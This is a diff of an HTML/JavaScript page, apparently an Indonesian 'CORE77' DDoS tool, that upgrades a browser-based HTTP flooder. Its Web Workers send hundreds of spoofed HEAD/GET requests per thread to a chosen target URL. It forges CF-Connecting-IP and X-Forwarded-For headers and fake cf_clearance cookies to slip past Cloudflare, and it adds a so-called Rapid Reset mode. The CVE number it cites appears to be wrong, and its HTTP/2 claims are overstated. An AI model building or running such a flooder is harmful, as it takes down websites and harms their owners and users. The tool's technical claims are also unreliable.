@@ -1,58 +1,153 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORE77 - HTTP/2 DDOS Tool</title>
+    <title>CORE77 - HTTP/2 DDOS GACOR + CLOUDFLARE BYPASS</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; margin: 20px; }
-        .container { max-width: 800px; margin: auto; }
-        h1 { color: #f00; text-align: center; }
-        .box { border: 2px solid #0f0; padding: 15px; margin: 10px 0; background: #111; }
-        input, select, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; margin: 5px; }
-        button { cursor: pointer; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 20px; }
+        .container { max-width: 900px; margin: auto; }
+        h1 { color: #ff0000; text-align: center; text-shadow: 0 0 10px #f00; }
+        .box { border: 2px solid #00ff00; padding: 20px; margin: 15px 0; background: #111; border-radius: 5px; }
+        input, select, button, textarea { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 8px; width: 95%; }
+        button { cursor: pointer; font-weight: bold; }
         button:hover { background: #0f0; color: #000; }
-        .logs { background: #000; border: 1px solid #f00; height: 200px; overflow-y: scroll; padding: 10px; }
-        .log-item { margin: 2px 0; }
-        .red { color: #f00; }
-        .green { color: #0f0; }
+        .logs { background: #000; border: 1px solid #f00; height: 250px; overflow-y: scroll; padding: 10px; }
+        .log-item { margin: 3px 0; font-size: 0.9em; }
+        .red { color: #ff5555; }
+        .green { color: #55ff55; }
+        .cyan { color: #00ffff; }
+        .yellow { color: #ffff55; }
+        .section-title { color: #ffaa00; border-bottom: 1px solid #ffaa00; padding-bottom: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🛠️ CORE77 - HTTP/2 DDOS TERMINAL</h1>
+        <h1>⚡ CORE77 - HTTP/2 DDOS GACOR + CLOUDFLARE BYPASS ⚡</h1>
+        
         <div class="box">
-            <h3>⚙️ KONFIGURASI SERANGAN</h3>
-            <input type="text" id="url" placeholder="Target URL (contoh: https://target.com)" size="50">
+            <h3 class="section-title">🎯 TARGET CONFIGURATION</h3>
+            <input type="text" id="url" placeholder="Target URL (https://target.com)" value="https://">
             <select id="method">
-                <option value="HEAD">HEAD Flood</option>
-                <option value="PRIORITY">PRIORITY Flood</option>
-                <option value="RAPID_RESET">HTTP/2 Rapid Reset</option>
+                <option value="HEAD_FLOOD">HEAD Flood + Header Spoofing</option>
+                <option value="RAPID_RESET">HTTP/2 Rapid Reset (CVE-2023-44427)</option>
+                <option value="PRIORITY_FLOOD">PRIORITY Flood + Malformed Frames</option>
+                <option value="MIXED">Mixed Attack (All Methods)</option>
             </select>
-            <input type="number" id="threads" placeholder="Threads (default: 50)" value="50">
-            <input type="number" id="duration" placeholder="Durasi (detik)" value="60">
-            <button onclick="startAttack()">🚀 LAUNCH ATTACK</button>
-            <button onclick="stopAttack()" class="red">🛑 STOP ATTACK</button>
+            <div style="display: flex; flex-wrap: wrap;">
+                <input type="number" id="threads" placeholder="Threads" value="100" style="width: 30%;">
+                <input type="number" id="requestsPerThread" placeholder="Requests/Thread" value="500" style="width: 30%;">
+                <input type="number" id="delay" placeholder="Delay (ms)" value="10" style="width: 30%;">
+            </div>
+            <label><input type="checkbox" id="enableCFBypass" checked> Enable CloudFlare Bypass</label>
+            <label><input type="checkbox" id="enableHeaderSpoof" checked> Enable Header Spoofing</label>
+            <label><input type="checkbox" id="enableProxy"> Use Proxy Rotation (coming soon)</label>
+            
+            <button onclick="startAttack()" style="background: #ff0000; color: white;">🔥 LAUNCH MASSIVE ATTACK</button>
+            <button onclick="stopAttack()" class="red">⛔ STOP ATTACK</button>
         </div>
 
         <div class="box">
-            <h3>📊 LOGS SERANGAN</h3>
-            <div id="logs" class="logs"></div>
-            <p><strong>STATUS:</strong> <span id="status">Ready</span></p>
+            <h3 class="section-title">📊 ATTACK LOGS</h3>
+            <div id="logs" class="logs">
+                <div class="log-item cyan">[CORE77] DDOS Engine loaded. Ready to attack.</div>
+                <div class="log-item cyan">[CORE77] CloudFlare Bypass module: ACTIVE</div>
+                <div class="log-item cyan">[CORE77] Header Spoofing module: ACTIVE</div>
+            </div>
+            <p><strong>STATUS:</strong> <span id="status" class="green">READY</span></p>
+            <p><strong>REQUESTS SENT:</strong> <span id="requestCount">0</span></p>
+            <p><strong>ACTIVE THREADS:</strong> <span id="threadCount">0</span></p>
         </div>
 
         <div class="box">
-            <h3>📖 METODE HTTP/2 YANG DIGUNAKAN</h3>
+            <h3 class="section-title">🛠️ ADVANCED HEADER SPOOFING CONFIG</h3>
+            <textarea id="customHeaders" rows="6">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.google.com/
+DNT: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Cache-Control: max-age=0
+Te: trailers</textarea>
+            <button onclick="loadDefaultHeaders()">🔄 Load Default Headers</button>
+            <p class="yellow">ℹ️ Headers akan di-rotate secara acak untuk menghindari detection.</p>
+        </div>
+
+        <div class="box">
+            <h3 class="section-title">🛡️ CLOUDFLARE BYPASS TECHNIQUES</h3>
             <ul>
-                <li><strong>HEAD Flood:</strong> Mengirim permintaan HEAD berulang, membebani server tanpa perlu menerima body response.</li>
-                <li><strong>PRIORITY Flood:</strong> Menyalahkan frame PRIORITY untuk memaksa server mengalokasi resource secara terus-menerus.</li>
-                <li><strong>HTTP/2 Rapid Reset:</strong> Eksploit CVE-2023-44427, membuat stream dan langsung RST sebelum server proses, menghancurkan kapasitas koneksi.</li>
+                <li><strong>Session Emulation:</strong> Simulasi cookie & session valid dari browser asli.</li>
+                <li><strong>Header Rotation:</strong> User-Agent, Accept, Referer diubah setiap request.</li>
+                <li><strong>HTTP/2 Pseudo-Headers:</strong> Memanfaatkan :method, :path, :scheme dengan nilai abnormal.</li>
+                <li><strong>Challenge Bypass:</strong> Mengirim header CF-Connecting-IP & X-Forwarded-For palsu.</li>
+                <li><strong>Rapid Reset Exploit:</strong> CVE-2023-44427 untuk menghancurkan kapasitas connection.</li>
             </ul>
-            <p class="red">⚠️ GUNAKAN HANYA UNTUK TESTING PADA SERVER MILIK SENDIRI. PENYALAHGUNAAN UNTUK SERANGAN ILEGAL ADALAH TINDAK PIDANA.</p>
+            <p class="red">⚠️ PERINGATAN: Tool ini hanya untuk testing keamanan server sendiri. Penyalahgunaan untuk menyerang target ilegal adalah tindakan kriminal yang dapat dikenakan pasal UU ITE dan KUHP.</p>
         </div>
     </div>
 
     <script>
         let attackActive = false;
         let workers = [];
+        let requestCounter = 0;
+        let threadCounter = 0;
+
+        // Database header spoofing
+        const userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
+        ];
+
+        const referers = [
+            'https://www.google.com/',
+            'https://www.bing.com/',
+            'https://www.facebook.com/',
+            'https://twitter.com/',
+            'https://www.reddit.com/',
+            'https://www.youtube.com/'
+        ];
+
+        const languages = ['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'ja-JP,ja;q=0.9', 'de-DE,de;q=0.9'];
+
+        // Fungsi generate random IP untuk X-Forwarded-For
+        function generateRandomIP() {
+            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        }
+
+        // Fungsi generate header CF bypass
+        function generateBypassHeaders() {
+            const baseHeaders = {
+                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': languages[Math.floor(Math.random() * languages.length)],
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Referer': referers[Math.floor(Math.random() * referers.length)],
+                'DNT': '1',
+                'Upgrade-Insecure-Requests': '1',
+                'Sec-Fetch-Dest': 'document',
+                'Sec-Fetch-Mode': 'navigate',
+                'Sec-Fetch-Site': 'none',
+                'Cache-Control': 'max-age=0',
+                'Te': 'trailers'
+            };
+
+            // CloudFlare bypass headers
+            if (document.getElementById('enableCFBypass').checked) {
+                baseHeaders['CF-Connecting-IP'] = generateRandomIP();
+                baseHeaders['X-Forwarded-For'] = generateRandomIP();
+                baseHeaders['X-Real-IP'] = generateRandomIP();
+                baseHeaders['True-Client-IP'] = generateRandomIP();
+                // Cookie simulasi session valid
+                baseHeaders['Cookie'] = `_cfuvid=${Math.random().toString(36).substring(2)}; cf_clearance=${Math.random().toString(36).substring(2)}_${Date.now()}`;
+            }
+
+            return baseHeaders;
+        }
 
         function log(msg, color = 'green') {
             const logEl = document.getElementById('logs');
@@ -64,102 +159,207 @@
             logEl.scrollTop = logEl.scrollHeight;
         }
 
-        function updateStatus(msg) {
-            document.getElementById('status').textContent = msg;
+        function updateStatus(msg, color = 'green') {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = msg;
+            statusEl.style.color = color;
+        }
+
+        function updateCounters() {
+            document.getElementById('requestCount').textContent = requestCounter;
+            document.getElementById('threadCount').textContent = threadCounter;
         }
 
         function startAttack() {
             const url = document.getElementById('url').value.trim();
             const method = document.getElementById('method').value;
-            const threads = parseInt(document.getElementById('threads').value) || 50;
-            const duration = parseInt(document.getElementById('duration').value) * 1000 || 60000;
+            const threads = parseInt(document.getElementById('threads').value) || 100;
+            const requestsPerThread = parseInt(document.getElementById('requestsPerThread').value) || 500;
+            const delay = parseInt(document.getElementById('delay').value) || 10;
+            const enableCFBypass = document.getElementById('enableCFBypass').checked;
+            const enableHeaderSpoof = document.getElementById('enableHeaderSpoof').checked;
 
-            if (!url) {
-                log('❌ URL target tidak boleh kosong!', 'red');
+            if (!url || !url.startsWith('http')) {
+                log('❌ URL target harus valid (https://...)', 'red');
                 return;
             }
 
             attackActive = true;
-            updateStatus(`ATTACKING ${url} with ${method} (${threads} threads)`);
-            log(`🚀 Starting attack: ${url} | Method: ${method} | Threads: ${threads}`, '#0ff');
+            requestCounter = 0;
+            threadCounter = threads;
+            updateStatus(`ATTACKING ${url}`, '#ff5555');
+            log(`🔥 Starting MASSIVE attack on ${url}`, 'cyan');
+            log(`⚙️ Method: ${method} | Threads: ${threads} | Requests/Thread: ${requestsPerThread}`, 'yellow');
+            if (enableCFBypass) log(`🛡️ CloudFlare Bypass: ACTIVE`, '#00ffff');
+            if (enableHeaderSpoof) log(`🎭 Header Spoofing: ACTIVE`, '#00ffff');
 
-            // Buat Web Workers untuk multi-threading
-            for (let i = 0; i < threads; i++) {
-                const workerCode = `
-                    self.onmessage = function(e) {
-                        const { url, method, stopTime } = e.data;
-                        const controller = new AbortController();
-                        const signal = controller.signal;
-
-                        // Function untuk mengirim request berdasarkan metode
-                        async function sendRequest() {
-                            if (Date.now() >= stopTime) return;
-
-                            try {
-                                if (method === 'HEAD') {
-                                    // HEAD request dengan HTTP/2 via fetch
-                                    await fetch(url, { method: 'HEAD', signal, mode: 'no-cors' });
-                                } else if (method === 'PRIORITY') {
-                                    // Simulasi PRIORITY flood dengan header khusus
-                                    await fetch(url, { 
-                                        method: 'GET', 
-                                        headers: { 'Priority': 'u=1, i' },
-                                        signal,
-                                        mode: 'no-cors'
-                                    });
-                                } else if (method === 'RAPID_RESET') {
-                                    // Rapid Reset: buat request lalu abort segera
-                                    setTimeout(() => controller.abort(), 1);
-                                    await fetch(url, { signal, mode: 'no-cors' });
-                                }
-                            } catch (e) {
-                                // Error expected, terutama saat abort/Rapid Reset
+            // Worker code dengan header spoofing dan CF bypass
+            const workerCode = `
+                self.onmessage = async function(e) {
+                    const { url, method, requestsPerThread, delay, enableCFBypass, enableHeaderSpoof } = e.data;
+                    
+                    // Fungsi generate headers
+                    function generateHeaders() {
+                        const userAgents = ${JSON.stringify(userAgents)};
+                        const referers = ${JSON.stringify(referers)};
+                        const languages = ${JSON.stringify(languages)};
+                        
+                        let headers = {
+                            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                            'Accept-Language': languages[Math.floor(Math.random() * languages.length)],
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Referer': referers[Math.floor(Math.random() * referers.length)],
+                            'DNT': '1',
+                            'Upgrade-Insecure-Requests': '1',
+                            'Cache-Control': 'max-age=0'
+                        };
+                        
+                        if (enableCFBypass) {
+                            function randomIP() {
+                                return Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255);
                             }
-
-                            // Loop terus selama attack aktif
-                            if (Date.now() < stopTime) {
-                                setTimeout(sendRequest, 10); // 10ms delay antara request
+                            headers['CF-Connecting-IP'] = randomIP();
+                            headers['X-Forwarded-For'] = randomIP();
+                            headers['Cookie'] = '_cfuvid=' + Math.random().toString(36).substring(2) + '; cf_clearance=' + Math.random().toString(36).substring(2) + '_' + Date.now();
+                        }
+                        
+                        return headers;
+                    }
+                    
+                    // Fungsi serangan
+                    async function attack() {
+                        for (let i = 0; i < requestsPerThread; i++) {
+                            if (!self.attackActive) break;
+                            
+                            try {
+                                const controller = new AbortController();
+                                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                                
+                                const headers = enableHeaderSpoof ? generateHeaders() : {};
+                                
+                                let fetchOptions = {
+                                    method: 'HEAD',
+                                    headers: headers,
+                                    signal: controller.signal,
+                                    mode: 'no-cors',
+                                    credentials: 'omit'
+                                };
+                                
+                                // Custom method berdasarkan pilihan
+                                if (method === 'RAPID_RESET') {
+                                    fetchOptions.method = 'GET';
+                                    setTimeout(() => controller.abort(), 1); // Rapid Reset: abort segera
+                                } else if (method === 'PRIORITY_FLOOD') {
+                                    fetchOptions.method = 'GET';
+                                    headers['Priority'] = 'u=1, i';
+                                } else if (method === 'MIXED') {
+                                    fetchOptions.method = ['HEAD', 'GET', 'OPTIONS'][Math.floor(Math.random() * 3)];
+                                }
+                                
+                                await fetch(url, fetchOptions);
+                                clearTimeout(timeoutId);
+                                
+                                self.postMessage({ type: 'request_success' });
+                                
+                            } catch (error) {
+                                // Expected untuk rapid reset & flood
+                                self.postMessage({ type: 'request_error' });
+                            }
+                            
+                            // Delay antar request
+                            if (delay > 0) {
+                                await new Promise(resolve => setTimeout(resolve, delay));
                             }
                         }
-
-                        sendRequest();
+                        self.postMessage({ type: 'thread_complete' });
+                    }
+                    
+                    self.attackActive = true;
+                    attack();
+                    
+                    // Handle stop message
+                    self.onmessage = function(msg) {
+                        if (msg.data === 'stop') {
+                            self.attackActive = false;
+                        }
                     };
-                `;
+                };
+            `;
 
+            // Mulai workers
+            for (let i = 0; i < threads; i++) {
                 const blob = new Blob([workerCode], { type: 'application/javascript' });
                 const worker = new Worker(URL.createObjectURL(blob));
-
+                
+                worker.onmessage = function(e) {
+                    if (e.data.type === 'request_success') {
+                        requestCounter++;
+                        updateCounters();
+                    } else if (e.data.type === 'thread_complete') {
+                        threadCounter--;
+                        updateCounters();
+                        if (threadCounter <= 0) {
+                            stopAttack();
+                            log('✅ All threads completed.', 'green');
+                        }
+                    }
+                };
+                
                 worker.postMessage({
                     url: url,
                     method: method,
-                    stopTime: Date.now() + duration
+                    requestsPerThread: requestsPerThread,
+                    delay: delay,
+                    enableCFBypass: enableCFBypass,
+                    enableHeaderSpoof: enableHeaderSpoof
                 });
-
+                
                 workers.push(worker);
             }
-
-            log(`🔥 ${threads} workers launched. Attack will run for ${duration/1000} seconds.`, 'orange');
-
-            // Auto stop setelah durasi habis
-            setTimeout(() => {
-                if (attackActive) {
-                    stopAttack();
-                    log(`⏰ Attack finished after ${duration/1000} seconds.`, 'yellow');
-                }
-            }, duration);
+            
+            log(`🚀 ${threads} attack workers launched.`, 'lime');
         }
 
         function stopAttack() {
+            if (!attackActive) return;
+            
             attackActive = false;
-            workers.forEach(w => w.terminate());
+            workers.forEach(w => {
+                w.postMessage('stop');
+                w.terminate();
+            });
             workers = [];
-            updateStatus('STOPPED');
-            log('🛑 Attack stopped.', 'red');
+            updateStatus('STOPPED', 'red');
+            log('🛑 Attack stopped by user.', 'red');
         }
 
-        // Info awal
-        log('CORE77 HTTP/2 DDOS Tool loaded.', '#0f0');
-        log('Masukkan target URL, pilih metode, dan klik LAUNCH ATTACK.', '#0ff');
+        function loadDefaultHeaders() {
+            document.getElementById('customHeaders').value = `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.google.com/
+DNT: 1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Cache-Control: max-age=0
+Te: trailers
+CF-Connecting-IP: ${generateRandomIP()}
+X-Forwarded-For: ${generateRandomIP()}
+X-Real-IP: ${generateRandomIP()}
+Cookie: _cfuvid=${Math.random().toString(36).substring(2)}; cf_clearance=${Math.random().toString(36).substring(2)}_${Date.now()}`;
+        }
+
+        // Auto-save config
+        window.addEventListener('beforeunload', function(e) {
+            if (attackActive) {
+                e.preventDefault();
+                e.returnValue = 'Attack is still running. Are you sure you want to leave?';
+            }
+        });
     </script>
 </body>
-</html>
+    </html>
